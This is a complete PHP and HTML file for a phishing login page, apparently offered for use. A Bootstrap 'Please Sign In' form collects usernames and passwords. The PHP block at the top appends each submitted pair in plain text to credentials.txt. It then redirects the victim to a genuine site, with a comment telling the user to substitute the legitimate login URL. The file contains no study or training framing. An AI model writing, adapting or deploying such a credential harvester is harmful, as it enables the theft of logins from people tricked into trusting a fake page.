<?php
// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture the posted username and password
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Write the credentials to a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "----------------------\n");
    fclose($file);

    // Redirect to a legitimate website after capturing credentials
    header('Location: https://www.example.com/login');  // Replace with the legitimate site
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 15px;
            margin: auto;
        }
        .form-signin {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form class="form-signin" method="POST">
            <h2 class="text-center mb-4">Please Sign In</h2>
            <div class="form-group mb-3">
                <label for="username" class="form-label">Username</label>
                <input type="text" name="username" class="form-control" id="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" name="password" class="form-control" id="password" placeholder="Enter your password" required>
            </div>
            <button class="btn btn-primary w-100" type="submit">Sign In</button>
        </form>
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
